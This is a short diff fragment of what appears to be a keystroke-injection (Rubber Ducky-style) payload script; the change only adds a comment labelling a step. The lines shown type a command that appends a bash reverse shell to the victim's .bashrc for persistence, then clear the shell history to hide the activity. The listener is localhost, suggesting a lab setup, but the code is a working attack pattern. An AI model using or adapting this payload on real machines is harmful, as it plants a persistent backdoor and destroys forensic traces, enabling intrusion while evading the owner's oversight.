@@ -13,6 +13,7 @@ STRING echo "bash -i >& /dev/tcp/127.0.0.1/1337 0>&1" >> .bashrc
 DELAY 200 
 ENTER
 
+REM Clear command history
 STRING history -c
 DELAY 200
 ENTER
